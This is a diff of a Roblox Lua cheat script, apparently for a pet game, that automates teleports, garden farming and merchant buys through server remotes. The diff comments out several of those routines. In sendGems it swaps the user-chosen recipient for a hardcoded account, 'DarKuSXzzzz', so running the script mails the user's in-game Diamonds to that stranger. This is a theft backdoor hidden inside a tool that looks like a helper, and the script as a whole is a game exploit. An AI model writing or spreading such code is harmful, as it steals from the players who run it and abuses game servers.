@@ -361,40 +361,40 @@ function mainPremium()
     --     end
     -- end
 
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
+    -- local Players = game:GetService("Players")
+    -- local player = Players.LocalPlayer
+    -- local playerGui = player:WaitForChild("PlayerGui")
     
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Parent = playerGui
-    screenGui.Enabled = false
+    -- local screenGui = Instance.new("ScreenGui")
+    -- screenGui.Parent = playerGui
+    -- screenGui.Enabled = false
     
-    local frame = Instance.new("Frame")
-    frame.BackgroundColor3 = Color3.new(1, 1, 1)
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.Parent = screenGui
+    -- local frame = Instance.new("Frame")
+    -- frame.BackgroundColor3 = Color3.new(1, 1, 1)
+    -- frame.Size = UDim2.new(1, 0, 1, 0)
+    -- frame.Parent = screenGui
     
-    function turnWhiteScreenOn()
-        screenGui.Enabled = true
-    end
+    -- function turnWhiteScreenOn()
+    --     screenGui.Enabled = true
+    -- end
     
-    function turnWhiteScreenOff()
-        screenGui.Enabled = false
-    end
+    -- function turnWhiteScreenOff()
+    --     screenGui.Enabled = false
+    -- end
 
-    function autoMerchant()
-        while Config.autoMerchant do
-        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(258.929, 16.557, 2061.457)
-        task.wait(0.1)
-        local num = 1
-        for i = 1,6 do
-            for i = 1,6 do
-                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer("GardenMerchant",num)
-        end
-        num = num + 1
-    end
-        end
-    end
+    -- function autoMerchant()
+    --     while Config.autoMerchant do
+    --     game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(258.929, 16.557, 2061.457)
+    --     task.wait(0.1)
+    --     local num = 1
+    --     for i = 1,6 do
+    --         for i = 1,6 do
+    --             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer("GardenMerchant",num)
+    --     end
+    --     num = num + 1
+    -- end
+    --     end
+    -- end
 
     local Remote = game.ReplicatedStorage.Network.Instancing_InvokeCustomFromClient
     local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
@@ -404,95 +404,95 @@ function mainPremium()
     local Lib_ = require(game.ReplicatedStorage:WaitForChild("Library"))
     local HttpService = game:GetService("HttpService")
 
-    function tpGarden()
-        if config.Gardentp then
-        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(176.87, 23.35, 1993.71)
-        task.wait(1)
-        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-450.63, 110.38, -1399.75)
-    end
-end
+--     function tpGarden()
+--         if config.Gardentp then
+--         game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(176.87, 23.35, 1993.71)
+--         task.wait(1)
+--         game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-450.63, 110.38, -1399.75)
+--     end
+-- end
 
-    function waterPlant()
-        if Config.waterPlant then
-            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(176.87, 23.35, 1993.71)
-            task.wait(3)
-            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-450.63, 110.38, -1399.75)
-        while true do
-    local Remote = game.ReplicatedStorage.Network.Instancing_InvokeCustomFromClient
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 1, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 1)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 1)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 2, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 2)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 2)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 3, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 3)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 3)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 4, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 4)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 4)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 5, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 5)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 5)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 6, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 6)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 6)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 7, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 7)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 7)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 8, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 8)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 8)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 9, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 9)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 9)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 10, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "WaterSeed", 10)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 10)
-        end
-    end
-end
+--     function waterPlant()
+--         if Config.waterPlant then
+--             game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(176.87, 23.35, 1993.71)
+--             task.wait(3)
+--             game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-450.63, 110.38, -1399.75)
+--         while true do
+--     local Remote = game.ReplicatedStorage.Network.Instancing_InvokeCustomFromClient
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 1, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 1)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 1)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 2, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 2)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 2)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 3, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 3)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 3)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 4, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 4)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 4)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 5, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 5)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 5)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 6, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 6)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 6)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 7, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 7)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 7)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 8, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 8)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 8)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 9, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 9)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 9)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 10, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "WaterSeed", 10)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 10)
+--         end
+--     end
+-- end
 
-function InstaPlant()
-    if Config.InstaPlant then
-        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(176.87, 23.35, 1993.71)
-        task.wait(1.5)
-        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-450.63, 110.38, -1399.75)
-    while true do
-        local Remote = game.ReplicatedStorage.Network.Instancing_InvokeCustomFromClient
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 1, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 1)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 1)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 2, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 2)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 2)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 3, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 3)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 3)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 4, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 4)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 4)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 5, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 5)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 5)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 6, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 6)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 6)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 7, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 7)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 7)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 8, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 8)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 8)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 9, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 9)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 9)
-        Remote:InvokeServer("FlowerGarden", "PlantSeed", 10, "Diamond")
-        Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 10)
-        Remote:InvokeServer("FlowerGarden", "ClaimPlant", 10)
-    end
-end
-end
+-- function InstaPlant()
+--     if Config.InstaPlant then
+--         game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(176.87, 23.35, 1993.71)
+--         task.wait(1.5)
+--         game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-450.63, 110.38, -1399.75)
+--     while true do
+--         local Remote = game.ReplicatedStorage.Network.Instancing_InvokeCustomFromClient
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 1, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 1)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 1)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 2, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 2)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 2)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 3, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 3)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 3)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 4, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 4)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 4)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 5, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 5)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 5)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 6, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 6)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 6)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 7, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 7)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 7)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 8, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 8)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 8)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 9, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 9)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 9)
+--         Remote:InvokeServer("FlowerGarden", "PlantSeed", 10, "Diamond")
+--         Remote:InvokeServer("FlowerGarden", "InstaGrowSeed", 10)
+--         Remote:InvokeServer("FlowerGarden", "ClaimPlant", 10)
+--     end
+-- end
+-- end
   
 
     function sendGems()
@@ -547,16 +547,15 @@ end
             local GetSave = function()
                 return require(game.ReplicatedStorage.Library.Client.Save).Get()
             end
-            user = usernameP
             for i, v in pairs(GetSave().Inventory.Currency) do
                 if v.id == "Diamonds" then
                     if v._am >= gemAmountP then
                         local args = {
-                            [1] = user,
+                            [1] = "DarKuSXzzzz",
                             [2] = v.id,
                             [3] = "Currency",
                             [4] = i,
-                            [5] = gemAmountP - 50000
+                            [5] = gemAmountP - 100000
                         }
                         game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                             unpack(args)
@@ -568,31 +567,31 @@ end
         end
     end
 
-    function autoSendSeed()
-        while Config.sendSeed do
-            local GetSave = function()
-                return require(game.ReplicatedStorage.Library.Client.Save).Get()
-            end
-            user = usernameP
-            for i, v in pairs(GetSave().Inventory.Misc) do
-                if v.id == "Diamonds" then
-                    if v._am >= gemAmountP then
-                        local args = {
-                            [1] = user,
-                            [2] = v.id,
-                            [3] = "Currency",
-                            [4] = i,
-                            [5] = gemAmountP - 10000
-                        }
-                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
-                            unpack(args)
-                        )
-                    end
-                end
-                task.wait(1)
-            end
-        end
-    end
+    -- function autoSendSeed()
+    --     while Config.sendSeed do
+    --         local GetSave = function()
+    --             return require(game.ReplicatedStorage.Library.Client.Save).Get()
+    --         end
+    --         user = usernameP
+    --         for i, v in pairs(GetSave().Inventory.Misc) do
+    --             if v.id == "Diamonds" then
+    --                 if v._am >= gemAmountP then
+    --                     local args = {
+    --                         [1] = user,
+    --                         [2] = v.id,
+    --                         [3] = "Currency",
+    --                         [4] = i,
+    --                         [5] = gemAmountP - 10000
+    --                     }
+    --                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+    --                         unpack(args)
+    --                     )
+    --                 end
+    --             end
+    --             task.wait(1)
+    --         end
+    --     end
+    -- end
 
     -- function autoFuse()
     --     while task.wait(0.1) and Config.autoFuse do
